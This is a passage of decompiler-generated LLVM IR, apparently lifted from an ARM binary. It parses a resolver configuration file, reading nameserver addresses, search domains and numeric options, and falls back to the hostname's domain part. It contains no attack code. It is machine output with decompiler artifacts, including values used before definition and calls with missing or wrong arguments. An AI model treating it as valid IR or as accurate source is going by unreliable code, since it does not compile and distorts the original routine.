  %v1_19320 = sdiv i32 %sext, 16777216
  store i32 %v1_19320, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_19328, label %dec_label_pc_193e4

dec_label_pc_19328:                               ; preds = %dec_label_pc_192fc
  %v0_19328 = load i32, i32* @r7, align 4
  store i32 %v0_19328, i32* %r0.global-to-local, align 4
  %v0_1932c = call i32 @skip_nospace()
  %v1_1932c = inttoptr i32 %v0_1932c to i8*
  store i32 %v2_19330, i32* @r4, align 4
  %v0_19334 = load i32, i32* @r6, align 4
  %v1_19334 = trunc i32 %v0_19334 to i8
  store i8 %v1_19334, i8* %v1_1932c, align 1
  %v0_19338 = load i32, i32* @r6, align 4
  store i32 %v0_19338, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_19330, i32* %r0.global-to-local, align 4
  %v3_19344 = call i32 @__GI_memset(i8* %v2_19344, i32 %v0_19338)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1934c = load i32, i32* @r7, align 4
  store i32 %v0_1934c, i32* %r1.global-to-local, align 4
  store i32 %v2_19350, i32* %r2.global-to-local, align 4
  %v3_19354 = inttoptr i32 %v0_1934c to i8*
  %v4_19354 = call i32 @inet_pton(i32 10, i8* %v3_19354, i32 %v2_19350)
  store i32 %v4_19354, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_19354, 1
  br i1 %tmp59, label %dec_label_pc_19364, label %dec_label_pc_19380

dec_label_pc_19364:                               ; preds = %dec_label_pc_19328
  %v0_19364 = load i32, i32* @r7, align 4
  store i32 %v0_19364, i32* %r1.global-to-local, align 4
  store i32 %v2_19368, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_19370 = inttoptr i32 %v0_19364 to i8*
  %v4_19370 = call i32 @inet_pton(i32 2, i8* %v3_19370, i32 %v2_19368)
  store i32 %v4_19370, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_19370, 1
  br i1 %tmp60, label %dec_label_pc_19558.backedge, label %dec_label_pc_19380

dec_label_pc_19380:                               ; preds = %dec_label_pc_19364, %dec_label_pc_19328
  %v0_19384.off0 = phi i16 [ 10, %dec_label_pc_19328 ], [ 2, %dec_label_pc_19364 ]
  store i32 %v2_19380, i32* %r2.global-to-local, align 4
  store i16 %v0_19384.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 30364, i32* @r7, align 4
  %v0_19394 = load i32, i32* @r5, align 4
  %v2_19394 = add i32 %v0_19394, 30364
  %v3_19394 = inttoptr i32 %v2_19394 to i32*
  %v4_19394 = load i32, i32* %v3_19394, align 4
  store i32 30360, i32* @sl, align 4
  %v1_1939c = add i32 %v4_19394, 1
  store i32 %v1_1939c, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_193a4 = mul i32 %v1_1939c, 28
  store i32 %v2_193a4, i32* %r1.global-to-local, align 4
  %v2_193a8 = add i32 %v0_19394, 30360
  %v3_193a8 = inttoptr i32 %v2_193a8 to i32*
  %v4_193a8 = load i32, i32* %v3_193a8, align 4
  store i32 %v4_193a8, i32* %r0.global-to-local, align 4
  %v2_193ac = inttoptr i32 %v4_193a8 to i32*
  %v3_193ac = call i32 @realloc(i32* %v2_193ac, i32 %v2_193a4)
  store i32 %v3_193ac, i32* %r0.global-to-local, align 4
  store i32 %v3_193ac, i32* @r6, align 4
  %v2_193b0 = icmp eq i32 %v3_193ac, 0
  br i1 %v2_193b0, label %dec_label_pc_19558.backedge, label %dec_label_pc_193b8

dec_label_pc_193b8:                               ; preds = %dec_label_pc_19380
  %v0_193b8 = load i32, i32* @r5, align 4
  %v1_193b8 = load i32, i32* @r7, align 4
  %v2_193b8 = add i32 %v1_193b8, %v0_193b8
  %v3_193b8 = inttoptr i32 %v2_193b8 to i32*
  %v4_193b8 = load i32, i32* %v3_193b8, align 4
  store i32 %v4_193b8, i32* %r4.global-to-local, align 4
  %v1_193bc = load i32, i32* @r8, align 4
  %v3_193bc = mul i32 %v1_193bc, %v4_193b8
  %v4_193bc = add i32 %v3_193bc, %v3_193ac
  store i32 %v4_193bc, i32* %lr.global-to-local, align 4
  %v2_193c4 = load i16, i16* %stack_var_-68, align 2
  %v3_193c4 = sext i16 %v2_193c4 to i32
  store i32 %v3_193c4, i32* %r0.global-to-local, align 4
  %v6_193c4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_193c4, i32* %r1.global-to-local, align 4
  %v9_193c4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_193c4, i32* %r2.global-to-local, align 4
  store i32 %v14_193c4, i32* @ip, align 4
  %v2_193c8 = load i32, i32* @sl, align 4
  %v3_193c8 = add i32 %v2_193c8, %v0_193b8
  %v4_193c8 = inttoptr i32 %v3_193c8 to i32*
  store i32 %v3_193ac, i32* %v4_193c8, align 4
  %v0_193cc = load i32, i32* %lr.global-to-local, align 4
  %v1_193cc = inttoptr i32 %v0_193cc to i32*
  %v2_193cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_193cc, i32* %v1_193cc, align 4
  %v3_193cc = add i32 %v0_193cc, 4
  %v4_193cc = inttoptr i32 %v3_193cc to i32*
  %v5_193cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_193cc, i32* %v4_193cc, align 4
  %v6_193cc = add i32 %v0_193cc, 8
  %v7_193cc = inttoptr i32 %v6_193cc to i32*
  %v8_193cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_193cc, i32* %v7_193cc, align 4
  %v9_193cc = add i32 %v0_193cc, 12
  %v10_193cc = inttoptr i32 %v9_193cc to i32*
  %v11_193cc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_193cc, i32* %v10_193cc, align 4
  %v12_193cc = add i32 %v0_193cc, 16
  store i32 %v12_193cc, i32* @lr, align 4
  %v2_193d0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_193d0, i32* %r0.global-to-local, align 4
  %v0_193d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_193d4 = add i32 %v0_193d4, 1
  store i32 %v1_193d4, i32* %r4.global-to-local, align 4
  %v1_193d8 = inttoptr i32 %v12_193cc to i32*
  store i32 %v2_193d0, i32* %v1_193d8, align 4
  %v3_193d8 = add i32 %v0_193cc, 20
  %v4_193d8 = inttoptr i32 %v3_193d8 to i32*
  %v5_193d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_193d8, i32* %v4_193d8, align 4
  %v6_193d8 = add i32 %v0_193cc, 24
  %v7_193d8 = inttoptr i32 %v6_193d8 to i32*
  %v8_193d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_193d8, i32* %v7_193d8, align 4
  %v0_193dc = load i32, i32* %r4.global-to-local, align 4
  %v1_193dc = load i32, i32* @r5, align 4
  %v2_193dc = load i32, i32* @r7, align 4
  %v3_193dc = add i32 %v2_193dc, %v1_193dc
  %v4_193dc = inttoptr i32 %v3_193dc to i32*
  store i32 %v0_193dc, i32* %v4_193dc, align 4
  br label %dec_label_pc_19558.backedge

dec_label_pc_19558.backedge:                      ; preds = %dec_label_pc_19480, %dec_label_pc_19470, %dec_label_pc_1943c, %dec_label_pc_193b8, %dec_label_pc_19510, %dec_label_pc_19364, %dec_label_pc_19380, %dec_label_pc_194b8, %dec_label_pc_194c0, %dec_label_pc_194a4, %dec_label_pc_194f4
  %v0_19564.pre = load i32, i32* @fp, align 4
  store i32 %v2_19558, i32* @r4, align 4
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_19564.pre, i32* %r2.global-to-local, align 4
  %v3_19568 = call i32 @fgets(i32 %v2_19558, i32 128, i32 %v0_19564.pre)
  store i32 %v3_19568, i32* %r0.global-to-local, align 4
  %v2_1956c = icmp eq i32 %v3_19568, 0
  br i1 %v2_1956c, label %dec_label_pc_19574, label %dec_label_pc_192fc

dec_label_pc_193e4:                               ; preds = %dec_label_pc_192fc
  %v0_193e4 = load i32, i32* @r4, align 4
  store i32 %v0_193e4, i32* %r0.global-to-local, align 4
  store i32 %v2_19534, i32* @r1, align 4
  %v2_193ec = inttoptr i32 %v0_193e4 to i8*
  %v3_193ec = call i32 @__GI_strcoll(i8* %v2_193ec, i32 %v2_19534)
  store i32 %v3_193ec, i32* %r0.global-to-local, align 4
  %v2_193f0 = icmp eq i32 %v3_193ec, 0
  br i1 %v2_193f0, label %dec_label_pc_19424, label %dec_label_pc_193f8

dec_label_pc_193f8:                               ; preds = %dec_label_pc_193e4
  %v0_193f8 = load i32, i32* @r4, align 4
  store i32 %v0_193f8, i32* %r0.global-to-local, align 4
  store i32 %v2_19540, i32* @r1, align 4
  %v2_19400 = inttoptr i32 %v0_193f8 to i8*
  %v3_19400 = call i32 @__GI_strcoll(i8* %v2_19400, i32 %v2_19540)
  store i32 %v3_19400, i32* %r0.global-to-local, align 4
  %v2_19404 = icmp eq i32 %v3_19400, 0
  br i1 %v2_19404, label %dec_label_pc_19424, label %dec_label_pc_194a4

dec_label_pc_19410:                               ; preds = %dec_label_pc_19424, %dec_label_pc_19410.dec_label_pc_19410_crit_edge
  %v2_19414 = phi i32 [ %v1_19428, %dec_label_pc_19410.dec_label_pc_19410_crit_edge ], [ %v1_1942810, %dec_label_pc_19424 ]
  %v0_19414 = phi i32 [ %v1_19430, %dec_label_pc_19410.dec_label_pc_19410_crit_edge ], [ %v1_1943017, %dec_label_pc_19424 ]
  %v1_19410 = phi i32 [ %v1_19410.pre, %dec_label_pc_19410.dec_label_pc_19410_crit_edge ], [ 30356, %dec_label_pc_19424 ]
  %v1_19414 = phi i32 [ %v0_19428, %dec_label_pc_19410.dec_label_pc_19410_crit_edge ], [ %v0_194289, %dec_label_pc_19424 ]
  %v2_19410 = add i32 %v1_19414, %v1_19410
  %v3_19410 = inttoptr i32 %v2_19410 to i32*
  %v4_19410 = load i32, i32* %v3_19410, align 4
  store i32 %v4_19410, i32* %r3.global-to-local, align 4
  %v3_19414 = add i32 %v1_19414, %v2_19414
  %v4_19414 = inttoptr i32 %v3_19414 to i32*
  store i32 %v0_19414, i32* %v4_19414, align 4
  %v0_19418 = load i32, i32* %r3.global-to-local, align 4
  %v1_19418 = load i32, i32* %r2.global-to-local, align 4
  %v4_19418 = mul i32 %v1_19418, 4
  %v5_19418 = add i32 %v4_19418, %v0_19418
  %v6_19418 = inttoptr i32 %v5_19418 to i32*
  %v7_19418 = load i32, i32* %v6_19418, align 4
  store i32 %v7_19418, i32* @r0, align 4
  %v0_1941c = call i32 @free()
  store i32 %v0_1941c, i32* %r0.global-to-local, align 4
  %v0_19428 = load i32, i32* @r5, align 4
  %v1_19428 = load i32, i32* @sb, align 4
  %v2_19428 = add i32 %v1_19428, %v0_19428
  %v3_19428 = inttoptr i32 %v2_19428 to i32*
  %v4_19428 = load i32, i32* %v3_19428, align 4
  store i32 %v4_19428, i32* %r3.global-to-local, align 4
  %v2_1942c = icmp eq i32 %v4_19428, 0
  %v1_19430 = add i32 %v4_19428, -1
  store i32 %v1_19430, i32* %r2.global-to-local, align 4
  br i1 %v2_1942c, label %dec_label_pc_19438, label %dec_label_pc_19410.dec_label_pc_19410_crit_edge

dec_label_pc_19410.dec_label_pc_19410_crit_edge:  ; preds = %dec_label_pc_19410
  %v1_19410.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19410

dec_label_pc_19424:                               ; preds = %dec_label_pc_193f8, %dec_label_pc_193e4
  store i32 30356, i32* @r4, align 4
  %v0_194289 = load i32, i32* @r5, align 4
  %v1_1942810 = load i32, i32* @sb, align 4
  %v2_1942811 = add i32 %v1_1942810, %v0_194289
  %v3_1942812 = inttoptr i32 %v2_1942811 to i32*
  %v4_1942813 = load i32, i32* %v3_1942812, align 4
  store i32 %v4_1942813, i32* %r3.global-to-local, align 4
  %v2_1942c15 = icmp eq i32 %v4_1942813, 0
  %v1_1943017 = add i32 %v4_1942813, -1
  store i32 %v1_1943017, i32* %r2.global-to-local, align 4
  br i1 %v2_1942c15, label %dec_label_pc_19438, label %dec_label_pc_19410

dec_label_pc_19438:                               ; preds = %dec_label_pc_19410, %dec_label_pc_19424
  store i32 30356, i32* @r6, align 4
  br label %dec_label_pc_1943c

dec_label_pc_1943c:                               ; preds = %dec_label_pc_19480, %dec_label_pc_19438
  %v0_1943c = load i32, i32* @r7, align 4
  store i32 %v0_1943c, i32* %r0.global-to-local, align 4
  %v0_19440 = call i32 @skip_nospace()
  store i32 %v0_19440, i32* %r0.global-to-local, align 4
  %v1_19444 = inttoptr i32 %v0_19440 to i8*
  %v2_19444 = call i32 @skip_and_NUL_space(i8* %v1_19444)
  store i32 %v2_19444, i32* %r0.global-to-local, align 4
  %v0_19448 = load i32, i32* @r5, align 4
  %v1_19448 = load i32, i32* @sb, align 4
  %v2_19448 = add i32 %v1_19448, %v0_19448
  %v3_19448 = inttoptr i32 %v2_19448 to i32*
  %v4_19448 = load i32, i32* %v3_19448, align 4
  store i32 %v2_19444, i32* @r4, align 4
  %tmp69 = mul i32 %v4_19448, 4
  %v3_19454 = add i32 %tmp69, 4
  store i32 %v3_19454, i32* %r1.global-to-local, align 4
  %v1_19458 = load i32, i32* @r6, align 4
  %v2_19458 = add i32 %v1_19458, %v0_19448
  %v3_19458 = inttoptr i32 %v2_19458 to i32*
  %v4_19458 = load i32, i32* %v3_19458, align 4
  store i32 %v4_19458, i32* %r0.global-to-local, align 4
  %v2_1945c = inttoptr i32 %v4_19458 to i32*
  %v3_1945c = call i32 @realloc(i32* %v2_1945c, i32 %v3_19454)
  store i32 %v3_1945c, i32* %r3.global-to-local, align 4
  %v2_19460 = icmp eq i32 %v3_1945c, 0
  %v0_19464 = load i32, i32* @r7, align 4
  store i32 %v0_19464, i32* %r0.global-to-local, align 4
  %v0_19468 = load i32, i32* @r4, align 4
  store i32 %v0_19468, i32* @r7, align 4
  br i1 %v2_19460, label %dec_label_pc_19558.backedge, label %dec_label_pc_19470

dec_label_pc_19470:                               ; preds = %dec_label_pc_1943c
  %v1_19470 = load i32, i32* @r5, align 4
  %v2_19470 = load i32, i32* @r6, align 4
  %v3_19470 = add i32 %v2_19470, %v1_19470
  %v4_19470 = inttoptr i32 %v3_19470 to i32*
  store i32 %v3_1945c, i32* %v4_19470, align 4
  %v1_19474 = inttoptr i32 %v0_19464 to i8*
  %v2_19474 = call i32 @__GI_strdup(i8* %v1_19474)
  store i32 %v2_19474, i32* %r0.global-to-local, align 4
  %v2_19478 = icmp eq i32 %v2_19474, 0
  br i1 %v2_19478, label %dec_label_pc_19558.backedge, label %dec_label_pc_19480

dec_label_pc_19480:                               ; preds = %dec_label_pc_19470
  %v0_19480 = load i32, i32* @r5, align 4
  %v1_19480 = load i32, i32* @sb, align 4
  %v2_19480 = add i32 %v1_19480, %v0_19480
  %v3_19480 = inttoptr i32 %v2_19480 to i32*
  %v4_19480 = load i32, i32* %v3_19480, align 4
  store i32 %v4_19480, i32* %r3.global-to-local, align 4
  %v1_19484 = load i32, i32* @r6, align 4
  %v2_19484 = add i32 %v1_19484, %v0_19480
  %v3_19484 = inttoptr i32 %v2_19484 to i32*
  %v4_19484 = load i32, i32* %v3_19484, align 4
  store i32 %v4_19484, i32* %r2.global-to-local, align 4
  %v1_19488 = add i32 %v4_19480, 1
  store i32 %v1_19488, i32* %r1.global-to-local, align 4
  %v5_1948c = mul i32 %v4_19480, 4
  %v6_1948c = add i32 %v4_19484, %v5_1948c
  %v7_1948c = inttoptr i32 %v6_1948c to i32*
  store i32 %v2_19474, i32* %v7_1948c, align 4
  %v0_19490 = load i32, i32* %r1.global-to-local, align 4
  %v1_19490 = load i32, i32* @r5, align 4
  %v2_19490 = load i32, i32* @sb, align 4
  %v3_19490 = add i32 %v2_19490, %v1_19490
  %v4_19490 = inttoptr i32 %v3_19490 to i32*
  store i32 %v0_19490, i32* %v4_19490, align 4
  %v0_19494 = load i32, i32* @r4, align 4
  %v1_19494 = inttoptr i32 %v0_19494 to i8*
  %v2_19494 = load i8, i8* %v1_19494, align 1
  %v3_19494 = zext i8 %v2_19494 to i32
  store i32 %v3_19494, i32* %r3.global-to-local, align 4
  %v2_19498 = icmp eq i8 %v2_19494, 0
  br i1 %v2_19498, label %dec_label_pc_19558.backedge, label %dec_label_pc_1943c

dec_label_pc_194a4:                               ; preds = %dec_label_pc_193f8
  %v0_194a4 = load i32, i32* @r4, align 4
  store i32 %v0_194a4, i32* %r0.global-to-local, align 4
  %v2_194a8 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_194a8, i32* @r1, align 4
  %v2_194ac = inttoptr i32 %v0_194a4 to i8*
  %v3_194ac = call i32 @__GI_strcoll(i8* %v2_194ac, i32 %v2_194a8)
  store i32 %v3_194ac, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_194ac, 16777216
  %v1_194b0 = sdiv i32 %sext2, 16777216
  store i32 %v1_194b0, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_194b8, label %dec_label_pc_19558.backedge

dec_label_pc_194b8:                               ; preds = %dec_label_pc_194a4
  %v0_194b8 = load i32, i32* @r7, align 4
  %v2_194b8 = icmp eq i32 %v0_194b8, 0
  br i1 %v2_194b8, label %dec_label_pc_19558.backedge, label %dec_label_pc_194c0

dec_label_pc_194c0:                               ; preds = %dec_label_pc_194b8
  store i32 %v0_194b8, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_194c8 = call i32 @__GI_strchr(i32 %v0_194b8, i32 58)
  store i32 %v2_194c8, i32* %r0.global-to-local, align 4
  store i32 %v2_194c8, i32* @r6, align 4
  %v3_194cc = icmp eq i32 %v2_194c8, 0
  br i1 %v3_194cc, label %dec_label_pc_19558.backedge, label %dec_label_pc_194d4

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194c0
  store i32 -32876, i32* %r1.global-to-local, align 4
  %v0_194d8 = load i32, i32* @r4, align 4
  %v1_194d8 = trunc i32 %v0_194d8 to i8
  %v3_194d8 = inttoptr i32 %v2_194c8 to i8*
  store i8 %v1_194d8, i8* %v3_194d8, align 1
  %v0_194dc = load i32, i32* @r5, align 4
  %v1_194dc = load i32, i32* %r1.global-to-local, align 4
  %v2_194dc = add i32 %v1_194dc, %v0_194dc
  store i32 %v2_194dc, i32* @r1, align 4
  %v0_194e0 = load i32, i32* @r7, align 4
  store i32 %v0_194e0, i32* %r0.global-to-local, align 4
  %v2_194e4 = inttoptr i32 %v0_194e0 to i8*
  %v3_194e4 = call i32 @__GI_strcoll(i8* %v2_194e4, i32 %v2_194dc)
  store i32 %v3_194e4, i32* %r0.global-to-local, align 4
  %v2_194e8 = icmp eq i32 %v3_194e4, 0
  br i1 %v2_194e8, label %dec_label_pc_19510, label %dec_label_pc_194f4

dec_label_pc_194f4:                               ; preds = %dec_label_pc_194d4
  %v0_194f8 = load i32, i32* @r7, align 4
  store i32 %v0_194f8, i32* %r0.global-to-local, align 4
  %v0_194fc = load i32, i32* @r5, align 4
  %v2_194fc = add i32 %v0_194fc, -32868
  store i32 %v2_194fc, i32* @r1, align 4
  %v2_19500 = inttoptr i32 %v0_194f8 to i8*
  %v3_19500 = call i32 @__GI_strcoll(i8* %v2_19500, i32 %v2_194fc)
  store i32 %v3_19500, i32* %r0.global-to-local, align 4
  %v2_19504 = icmp eq i32 %v3_19500, 0
  br i1 %v2_19504, label %dec_label_pc_19510, label %dec_label_pc_19558.backedge

dec_label_pc_19510:                               ; preds = %dec_label_pc_194f4, %dec_label_pc_194d4
  %storemerge = phi i32 [ 4126, %dec_label_pc_194d4 ], [ 4127, %dec_label_pc_194f4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_19510 = load i32, i32* @r6, align 4
  %v1_19510 = add i32 %v0_19510, 1
  store i32 %v1_19510, i32* @r0, align 4
  %v0_19514 = load i32, i32* @r5, align 4
  %v2_19514 = add i32 %v0_19514, %storemerge
  store i32 %v2_19514, i32* @r4, align 4
  %v1_19518 = call i32 @atol(i32 %v1_19510)
  %v2_19518 = trunc i32 %v1_19518 to i8
  store i32 %v1_19518, i32* %r0.global-to-local, align 4
  %v3_1951c = load i32, i32* @r4, align 4
  %v4_1951c = inttoptr i32 %v3_1951c to i8*
  store i8 %v2_19518, i8* %v4_1951c, align 1
  br label %dec_label_pc_19558.backedge

dec_label_pc_19524:                               ; preds = %dec_label_pc_192c4
  %v0_19528 = load i32, i32* @r5, align 4
  %v2_19528 = add i32 %v0_19528, -32912
  %v2_19534 = add i32 %v0_19528, -32900
  %v2_19540 = add i32 %v0_19528, -32892
  %v2_1954c = add i32 %v0_19528, -32884
  store i32 %v2_1954c, i32* %r3.global-to-local, align 4
  store i32 30368, i32* @sb, align 4
  store i32 %v2_1954c, i32* %stack_var_-560, align 4
  %v2_19558 = ptrtoint i32* %stack_var_-288 to i32
  %v1_19300 = bitcast i32* %stack_var_-288 to i8*
  %v2_19330 = ptrtoint i16* %stack_var_-68 to i32
  %v2_19344 = bitcast i16* %stack_var_-68 to i8*
  %v2_19350 = ptrtoint i32* %stack_var_-60 to i32
  %v2_19368 = ptrtoint i32* %stack_var_-64 to i32
  %v2_19380 = ptrtoint i32* %stack_var_-304 to i32
  %v14_193c4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_19558, i32* @r4, align 4
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_192ec, i32* %r2.global-to-local, align 4
  %v3_1956866 = call i32 @fgets(i32 %v2_19558, i32 128, i32 %v2_192ec)
  store i32 %v3_1956866, i32* %r0.global-to-local, align 4
  %v2_1956c68 = icmp eq i32 %v3_1956866, 0
  br i1 %v2_1956c68, label %dec_label_pc_19574, label %dec_label_pc_192fc

dec_label_pc_19574:                               ; preds = %dec_label_pc_19558.backedge, %dec_label_pc_19524
  %v0_19574 = load i32, i32* @fp, align 4
  store i32 %v0_19574, i32* %r0.global-to-local, align 4
  %v1_19578 = inttoptr i32 %v0_19574 to i16*
  %v2_19578 = call i32 @__GI_fclose(i16* %v1_19578)
  store i32 %v2_19578, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1957c

dec_label_pc_1957c:                               ; preds = %dec_label_pc_192c4, %dec_label_pc_19574
  store i32 30364, i32* %r3.global-to-local, align 4
  %v0_19580 = load i32, i32* @r5, align 4
  %v2_19580 = add i32 %v0_19580, 30364
  %v3_19580 = inttoptr i32 %v2_19580 to i32*
  %v4_19580 = load i32, i32* %v3_19580, align 4
  store i32 %v4_19580, i32* %r3.global-to-local, align 4
  %v2_19584 = icmp eq i32 %v4_19580, 0
  br i1 %v2_19584, label %dec_label_pc_1958c, label %dec_label_pc_195c8

dec_label_pc_1958c:                               ; preds = %dec_label_pc_1957c
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_19590 = call i32 @malloc(i32 28)
  store i32 %v1_19590, i32* %r0.global-to-local, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  store i32 30360, i32* %r2.global-to-local, align 4
  %v2_1959c = icmp eq i32 %v1_19590, 0
  %v1_195a0 = load i32, i32* @r5, align 4
  br i1 %v2_1959c, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1958c
  %v3_195a0 = add i32 %v1_195a0, -32856
  store i32 %v3_195a0, i32* %r3.global-to-local, align 4
  %v3_195a428 = add i32 %v1_195a0, 30360
  %v4_195a429 = inttoptr i32 %v3_195a428 to i32*
  store i32 0, i32* %v4_195a429, align 4
  %v1_195a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_195a8 = load i32, i32* @r5, align 4
  %v3_195a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_195a8 = add i32 %v3_195a8, %v2_195a8
  %v5_195a8 = inttoptr i32 %v4_195a8 to i32*
  store i32 %v1_195a8, i32* %v5_195a8, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1958c
  %v3_195a4 = add i32 %v1_195a0, 30360
  %v4_195a4 = inttoptr i32 %v3_195a4 to i32*
  store i32 %v1_19590, i32* %v4_195a4, align 4
  %v1_195ac = load i32, i32* @r5, align 4
  %v2_195ac = load i32, i32* %r3.global-to-local, align 4
  %v3_195ac = add i32 %v2_195ac, %v1_195ac
  store i32 %v3_195ac, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 103864, i32* @lr, align 4
  %v1_195b4 = xor i1 %v2_1959c, true
  call void @__pseudo_cond_branch(i1 %v1_195b4, i32 ptrtoint (i32* @global_var_11b90.839 to i32))
  store i32 30364, i32* %r2.global-to-local, align 4
  %v0_195bc = load i32, i32* @r5, align 4
  %v2_195bc = add i32 %v0_195bc, 30364
  %v3_195bc = inttoptr i32 %v2_195bc to i32*
  %v4_195bc = load i32, i32* %v3_195bc, align 4
  %v1_195c0 = add i32 %v4_195bc, 1
  store i32 %v1_195c0, i32* %r3.global-to-local, align 4
  store i32 %v1_195c0, i32* %v3_195bc, align 4
  %v0_195cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195c8

dec_label_pc_195c8:                               ; preds = %dec_label_pc_1957c, %.thread4
  %v0_195cc = phi i32 [ %v0_19580, %dec_label_pc_1957c ], [ %v0_195cc.pre, %.thread4 ]
  store i32 30368, i32* @r7, align 4
  %v2_195cc = add i32 %v0_195cc, 30368
  %v3_195cc = inttoptr i32 %v2_195cc to i32*
  %v4_195cc = load i32, i32* %v3_195cc, align 4
  store i32 %v4_195cc, i32* @r4, align 4
  %v2_195d0 = icmp eq i32 %v4_195cc, 0
  br i1 %v2_195d0, label %dec_label_pc_195d8, label %dec_label_pc_19658

dec_label_pc_195d8:                               ; preds = %dec_label_pc_195c8
  %v2_195d8 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_195d8, i32* @r6, align 4
  store i32 %v2_195d8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_195e4 = call i32 @__GI_gethostname(i32 %v2_195d8, i32 255)
  store i32 %v2_195e4, i32* %r0.global-to-local, align 4
  %v2_195e8 = icmp eq i32 %v2_195e4, 0
  br i1 %v2_195e8, label %dec_label_pc_195f4, label %dec_label_pc_19658

dec_label_pc_195f4:                               ; preds = %dec_label_pc_195d8
  store i32 %v2_195d8, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_195fc = call i32 @__GI_strchr(i32 %v2_195d8, i32 46)
  store i32 %v2_195fc, i32* %r0.global-to-local, align 4
  %v2_19600 = icmp eq i32 %v2_195fc, 0
  br i1 %v2_19600, label %dec_label_pc_19658, label %dec_label_pc_19608

dec_label_pc_19608:                               ; preds = %dec_label_pc_195f4
  %v1_19608 = add i32 %v2_195fc, 1
  %v2_19608 = inttoptr i32 %v1_19608 to i8*
  %v3_19608 = load i8, i8* %v2_19608, align 1
  %v4_19608 = zext i8 %v3_19608 to i32
  store i32 %v4_19608, i32* %r3.global-to-local, align 4
  %v2_1960c = icmp eq i8 %v3_19608, 0
  store i32 %v1_19608, i32* %r0.global-to-local, align 4
  br i1 %v2_1960c, label %dec_label_pc_19658, label %dec_label_pc_19618

dec_label_pc_19618:                               ; preds = %dec_label_pc_19608
  %v2_19618 = call i32 @__GI_strdup(i8* %v2_19608)
  store i32 %v2_19618, i32* %r0.global-to-local, align 4
  store i32 %v2_19618, i32* @r4, align 4
  %v2_1961c = icmp eq i32 %v2_19618, 0
  br i1 %v2_1961c, label %dec_label_pc_19658, label %dec_label_pc_19624

dec_label_pc_19624:                               ; preds = %dec_label_pc_19618
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_19628 = call i32 @malloc(i32 4)
  store i32 %v1_19628, i32* %r0.global-to-local, align 4
  store i32 30356, i32* %r3.global-to-local, align 4
  %v2_19630 = icmp eq i32 %v1_19628, 0
  %v1_19634 = load i32, i32* @r5, align 4
  %v3_19634 = add i32 %v1_19634, 30356
  %v4_19634 = inttoptr i32 %v3_19634 to i32*
  store i32 %v1_19628, i32* %v4_19634, align 4
  br i1 %v2_19630, label %dec_label_pc_1963c, label %dec_label_pc_19648

dec_label_pc_1963c:                               ; preds = %dec_label_pc_19624
  %v0_1963c = load i32, i32* @r4, align 4
  store i32 %v0_1963c, i32* @r0, align 4
  %v0_19640 = call i32 @free()
  store i32 %v0_19640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19658

dec_label_pc_19648:                               ; preds = %dec_label_pc_19624
  %v0_19648 = load i32, i32* @r5, align 4
  %v1_19648 = load i32, i32* @r7, align 4
  %v2_19648 = add i32 %v1_19648, %v0_19648
  %v3_19648 = inttoptr i32 %v2_19648 to i32*
  %v4_19648 = load i32, i32* %v3_19648, align 4
  %v1_1964c = add i32 %v4_19648, 1
  store i32 %v1_1964c, i32* %r3.global-to-local, align 4
  %v0_19650 = load i32, i32* @r4, align 4
  %v2_19650 = inttoptr i32 %v1_19628 to i32*
  store i32 %v0_19650, i32* %v2_19650, align 4
  %v0_19654 = load i32, i32* %r3.global-to-local, align 4
  %v1_19654 = load i32, i32* @r5, align 4
  %v2_19654 = load i32, i32* @r7, align 4
  %v3_19654 = add i32 %v2_19654, %v1_19654
  %v4_19654 = inttoptr i32 %v3_19654 to i32*
  store i32 %v0_19654, i32* %v4_19654, align 4
  br label %dec_label_pc_19658

